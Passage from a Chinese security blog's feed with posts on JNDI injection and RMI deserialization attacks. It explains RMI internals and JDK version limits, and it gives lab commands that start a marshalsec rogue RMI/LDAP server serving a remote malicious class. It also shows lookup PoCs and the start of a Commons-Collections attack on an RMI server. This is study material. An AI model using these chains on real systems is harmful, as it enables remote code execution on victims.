class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用工具来起rmi服务端</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8090/#ExecTest</code></p><p>然后用python起ExecTest.class的web（此处用的是上文的第二种payload）</p><p><code>py -3 -m http.server 8090</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897bvch2cj326b185e0e.jpg" alt="JdbcRowSetImpl.png"></p><p>至于该如何让JdbcRowSetImpl_inc执行在受害者机器上，那就是反序列化利用链一样地衍生了，这边只是衍生出第一步说明，JNDI注入并不是一定要存在一个web服务对外，一定要有一个<code>ctx.lookup(uri)</code>的url参数可控，才能形成漏洞。</p><p>漏洞利用要考虑java环境、组件，不要跟SQL注入一样认为都是定死的。具体就结合fastjson再议了。</p><h2 id="RMI-LDAP注入java版本限制"><a href="#RMI-LDAP注入java版本限制" class="headerlink" title="RMI+LDAP注入java版本限制"></a>RMI+LDAP注入java版本限制</h2><p>我们再回到第二个版本限制问题：</p><p>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。</p><p>所以不受RMI动态加载恶意类的 <strong>java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性</strong>的限制。具有更多的利用空间</p><p>但是我们之前实验还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。（这也是我们之前1.8u191失败的原因）</p><p>之前也提到jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取</p><p>LDAP服务的Reference远程加载Factory类<strong>不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制</strong>，所以适用范围更广。</p><p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，<br>在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <strong>com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false</strong>。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg" alt="java封杀.png"></p><p>至于1.8u191之后咋办，我们新起一篇来讲述把；还是先来看一下可以绕过更多版本限制的LDAP+JNDI注入的利用方式</p><h2 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP+JNDI"></a>LDAP+JNDI</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实也就是一个数据库，可以把它与mysql对比！<br>具有以下特点：</p><ol><li>基于TCP/IP协议</li><li>同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作</li><li>相对于mysql的表型存储；不同的是LDAP使用<strong>树型</strong>存储<ol><li>因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能。</li></ol></li></ol><p>树层次分为以下几层：</p><ul><li>dn：一条记录的详细位置，由以下几种属性组成</li><li>dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）</li><li>ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）</li><li>cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）</li></ul><p>举个例子一条记录就是<br>dn=”uid=songtao.xu,ou=oa,dc=example,dc=com”</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可。</p><p>我们重点关注版本问题，我们在1.8u161版本(RMI+JNDI不行、LDAP+JNDI可以的版本)下去使用ldap+jndi注入</p><p>POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"ldap://127.0.0.1:1389/aa"</span>;</span><br><span class="line"><span class="comment">//        String uri = "rmi://127.0.0.1:1099/aa";</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务端一样用工具起来，不赘述。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897c3ew1cj31bq10pqhr.jpg" alt="1.8u161-ldap.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897cf4q73j31yi0vp430.jpg" alt="1.8u161-rmi.png"></p><p>结果没毛病</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>分析一通，小结就是以后渗透测试要用ldap-JNDI注入，命中率更高。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/115849.html</a><br><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a><br><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>RPC<br><a href="https://www.jianshu.com/p/2accc2840a1b" target="_blank" rel="noopener">https://www.jianshu.com/p/2accc2840a1b</a><br><a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">https://www.freebuf.com/column/189835.html</a><br>ldap<br><a href="https://www.cnblogs.com/wilburxu/p/9174353.html" target="_blank" rel="noopener">https://www.cnblogs.com/wilburxu/p/9174353.html</a><br><a href="https://www.jianshu.com/p/7e4d99f6baaf" target="_blank" rel="noopener">https://www.jianshu.com/p/7e4d99f6baaf</a><br><a href="https://blog.csdn.net/caoyujiao520/article/details/82762097" target="_blank" rel="noopener">https://blog.csdn.net/caoyujiao520/article/details/82762097</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇讲述了RMI-JNDI注入的利用原理，分析了利用流程；&lt;br&gt;使用了marshalsec反序列化工具去简单的起一个RMI/LDAP服务端
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RMI-反序列化</title>
    <link href="http://lalajun.com/2019/10/15/RMI-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://lalajun.com/2019/10/15/RMI-反序列化/</id>
    <published>2019-10-15T02:05:28.000Z</published>
    <updated>2019-11-30T06:08:13.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。</p><p>但是发现RMI在fastjson中的利用，只是JNDI注入的其中一种利用手段；与RMI本身的反序列化并不是很有关系。</p><p>原本想在一篇中整理清楚，由于JNDI注入知识点太过杂糅，将新起一篇说明。</p><p>此篇，我们以RMI服务入手，从基础使用开始再到反序列化利用。</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation），远程方法调用。跟RPC差不多，是java独立实现的一种机制。实际上就是在一个java虚拟机上调用另一个java虚拟机的对象上的方法。</p><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。（我们可以再之后数据包中看到该协议特征）</p><p>在RMI中对象是通过序列化方式进行编码传输的。（我们将在之后证实）</p><p>RMI分为三个主体部分：</p><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。</li></ul><p>总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样。</p><p>唯一区别就是RMI服务端提供的方法，被调用的时候该方法是<strong>执行在服务端</strong>。</p><blockquote><p>这一点一开始搞不清楚，在攻击利用中糊涂的话会很难受，被调用的方法实际上是在RMI服务端执行。<br>之前认为这一点跟fastjson利用RMI攻击相冲突，因为fastjson的payload是写在攻击者RMI服务器中，但是在实际上是在客户端执行。于RMI反序列化利用完全相反<br>但实际上这两种利用方式发生在完全不同的流程中。我们保持疑问先放一放，将在接下来解答。</p></blockquote><h3 id="RMI远程对象部署-调用流程"><a href="#RMI远程对象部署-调用流程" class="headerlink" title="RMI远程对象部署-调用流程"></a>RMI远程对象部署-调用流程</h3><p>要利用先使用。</p><p>Server部署：</p><ol><li>Server向Registry注册远程对象，远程对象绑定在一个<code>//hostL:port/objectname</code>上，形成一个映射表（Service-Stub）。</li></ol><p>Client调用：</p><ol><li>Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。</li><li>Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器</li><li>Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</li></ol><h3 id="RMI服务端与客户端实现"><a href="#RMI服务端与客户端实现" class="headerlink" title="RMI服务端与客户端实现"></a>RMI服务端与客户端实现</h3><ol><li>服务端编写一个远程接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个接口需要</p><ul><li>使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）</li><li>同时需要继承Remote接口</li><li>接口的方法需要生命java.rmi.RemoteException报错</li></ul><ol start="2"><li>服务端实现这个远程接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"构造函数中"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call from"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个实现类需要</p><ul><li>实现远程接口</li><li>继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上。<br>（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。）</li><li>构造函数需要抛出一个RemoteException错误</li><li>实现类中使用的对象必须都可序列化，即都继承java.io.Serializable</li></ul><ol start="3"><li>注册远程对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//远程接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//远程接口的实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//注册远程对象</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//远程对象实例</span></span><br><span class="line">        RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        <span class="comment">//创建注册中心</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">       <span class="comment">//绑定对象实例到注册中心</span></span><br><span class="line">        Naming.rebind(<span class="string">"//127.0.0.1/Hello"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//main函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>关于绑定的地址很多博客会<em>rmi://ip:port/Objectname</em>的形式<br>实际上看rebind源码就知道<em>RMI:</em>写不写都行;<br>port如果默认是1099，不写会自动补上，其他端口必须写</li></ul><blockquote><p>这里就会想一个问题：注册中心跟服务端可以分离么??????<br>个人感觉在分布式环境下是可以分离的，但是网上看到的代码都没见到分离的，以及官方文档是这么说的：</p><p><em>出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</em></p><p>那么就是一般来说注册中心跟服务端是不能分离的。但是个人感觉一些实际分布式管理下应该是可以的，这对我们攻击流程不影响，不纠结与此。</p></blockquote><p>那么服务端就部署好了，来看客户端</p><ol start="4"><li>客户端部署</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br><span class="line">        String ret = hello.hello(<span class="string">"input!gogogogo"</span>);</span><br><span class="line">        System.out.println( ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>需要使用远程接口（此处是直接引用服务端的类，客户端不知道这个类的源代码也是可以的，重点是包名，类名必须一致，serialVersionUID一致）</li><li>Naming.lookup查找远程对象，<em>rmi:</em>也可省略</li></ul><p>那么先运行服务端，再运行客户端，就可以完成调用</p><h3 id="通讯细节-反序列化"><a href="#通讯细节-反序列化" class="headerlink" title="通讯细节-反序列化"></a>通讯细节-反序列化</h3><p>但是我们需要分析具体通讯细节，来加深了解RMI的过程：<br>下面使用wireshark抓包查看数据。</p><p>由于自己抓包有混淆数据进入，不好看，总体流程引用<code>java安全漫谈-RMI篇</code>的数据流程图，再自己补充细节</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve50dcdsj324t0yre5d.jpg" alt="总体数据包.png"></p><p>我把总体数据包，分成以下四块：</p><ol><li>客户端与注册中心（1099端口）建立通讯；<br>客户端查询需要调用的函数的远程引用，注册中心返回远程引用和提供该服务的服务端IP与端口</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve2s7e25j31t20v6adl.jpg" alt="1.1_call.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve32w49wj321q19qdm5.jpg" alt="1.2_return.png"></p><blockquote><p><code>AC ED 00 05</code>是常见的java反序列化16进制特征<br>注意以上两个关键步骤都是使用序列化语句</p></blockquote><ol start="2"><li>客户端新起一个端口与服务端建立TCP通讯<br>客户端发送远程引用给服务端，服务端返回函数唯一标识符，来确认可以被调用(此处返回结果的含义打上问号，猜测大概是这个意思)</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3f8vl7j31rl1aqgs1.jpg" alt="2.1.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3nl2egj31om0zpn1i.jpg" alt="2.2.png"></p><p>同样使用序列化的传输形式</p><p>以上两个过程对应的代码是这一句（未确定）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br></pre></td></tr></table></figure></p><p>这里会返回一个PROXY类型函数（由于是之后补的图，代码不一样）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g82em5bejaj31qv0ypwip.jpg" alt="lookup结果.png"></p><ol start="3"><li><p>客户端与注册中心（1099端口）通讯，不知道在做啥</p></li><li><p>客户端序列化传输调用函数的输入参数至服务端<br>服务端返回序列化的执行结果至客户端</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3vpekvj31sc0rdadg.jpg" alt="3.1.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve42xmjxj31ua0m0n00.jpg" alt="3.2.png"></p><p>以上调用通讯过程对应的代码是这一句<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String ret = hello.hello(<span class="string">"input!gogogogo"</span>);</span><br></pre></td></tr></table></figure></p><p>可以看出所有的数据流都是使用序列化传输的，我们尝试从代码中找到对应的反序列化语句</p><p>RMI客户端发送调用函数输入参数的序列化过程，接受服务端返回内容的反序列化语句位置分别如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4h5x6oj326j0z1795.jpg" alt="客户端-服务端readObject().png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4q4ug8j31n00oc0v8.jpg" alt="客户端-服务端writeObject().png"></p><p>RMI服务端与客户端readObject其实位置是同一个地方，只是调用栈不同，位置如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve49vrpxj3287100464.jpg" alt="服务端ReadObject().png"></p><h3 id="RMI利用点"><a href="#RMI利用点" class="headerlink" title="RMI利用点"></a>RMI利用点</h3><p>那么我们可以确定RMI是一个基于序列化的java远程方法调用机制。我们来思考这个过程存在的漏洞点：</p><ol><li>控制？或探测可利用RMI服务</li></ol><p>可以看到我们可以使用rebind、 bind、unbind等方法，去在注册中心中注册调用方法。那我们是不是可以恶意去注册中心注册恶意的远程服务呢？</p><p>实际上是不行的。</p><p>RMI注册中心只有对于来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。<br>不过list和lookup方法可以远程调用。</p><p>list方法可以列出目标上所有绑定的对象：<br><code>String[] s = Naming.list(&quot;rmi://192.168.135.142:1099&quot;);</code></p><p>lookup作用就是获得某个远程对象。<br>如果对方RMI注册中心存在敏感远程服务，就可以进行探测调用（<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIE工具</a></p><ol start="2"><li>直接攻击RMI服务器</li></ol><p>他的RMI服务端存在readObject反序列化点。从通讯过程可知，服务端会对客户端的任意输入进行反序列化。</p><p>如果服务端存在漏洞组件版本（存在反序列化利用链），就可以对RMI服务接口进行反序列化攻击。我们将在接下来复现这个RMI服务的反序列化漏洞。它将导致RMI服务端任意命令执行。</p><p>（讲道理由于客户端同样存在ReadObject反序列化点，恶意服务端也可以打客户端，就不复现了）</p><ol><li>动态加载恶意类（RMI Remote Object Payload）</li></ol><p>上面没有说到：<br>RMI核心特点之一就是动态类加载。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类。</p><p>如果当前JVM中没有某个类的定义（即CLASSPATH下没有），它可以根据codebase去下载这个类的class，然后动态加载这个对象class文件。</p><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。所以动态加载的class文件可以保存在web服务器、ftp中。</p><p>如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，动态加载 org.vulhub.example.Example 类，<br>则Java虚拟机会下载这个文件<a href="http://example.com/org/vulhub/example/Example.class，并作为" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class，并作为</a> Example类的字节码。</p><p>那么只要控制了codebase，就可以加载执行恶意类。同时也存在一定的限制条件：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li></ul><p>java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。<br>具体细节在java安全漫谈-05 RMI篇（2）一文中有描述。<br>这边暂时只是讲述有这个漏洞原理，由于未找到真实利用场景，不细说。</p><blockquote><p>漏洞的主要原理是RMI远程对象加载，即RMI Class Loading机制，会导致RMI客户端命令执行的</p></blockquote><p>举一个小栗子：<br>客户端：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ICalc r = (ICalc) Naming.lookup(<span class="string">"rmi://192.168.135.142:1099/refObj"</span>);<span class="comment">//从服务端获取RMI服务</span></span><br><span class="line">List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();<span class="comment">//本地只有一个抽象接口，具体是从cosebase获取的class文件</span></span><br><span class="line">r.sum(li);<span class="comment">//RMI服务调用，在这里触发从cosebase中读取class文件执行</span></span><br></pre></td></tr></table></figure></p><ol start="4"><li>JNDI注入</li></ol><p>RMI服务端在绑定远程对象至注册中心时，不只是可以绑定RMI服务器本身上的对象，还可以使用Reference对象指定一个托管在第三方服务器上的class文件，再绑定给注册中心。<br>在客户端处理服务端返回数据时，发现是一个Reference对象，就会动态加载这个对象中的类。<br>攻击者只要能够</p><ol><li>控制RMI客户端去调用指定RMI服务器</li><li>在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类</li><li>远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码</li></ol><p>就可以达到RCE的效果。fasjson组件漏洞rmi、ldap的利用形式正是使用jndi注入，而不是有关RMI反序列化。</p><p>有关JNDI注入，以及其fastjson反序列化的例子相关知识太多。这篇只是引出，暂不表述。</p><blockquote><p>主要原理是JNDI Reference远程加载Object Factory类的特性。会导致客户端命令执行。<br>不受java.rmi.server.useCodebaseOnly 系统属性的限制，相对于前者来说更为通用</p></blockquote><h3 id="直接攻击RMI服务器-Commons-collections3-1"><a href="#直接攻击RMI服务器-Commons-collections3-1" class="headerlink" title="直接攻击RMI服务器 Commons-collections3.1"></a>直接攻击RMI服务器 Commons-collections3.1</h3><p>举例Commons-collection利用rmi调用的例子。</p><p>RMI服务端(受害者)，开启了一个RMI服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span 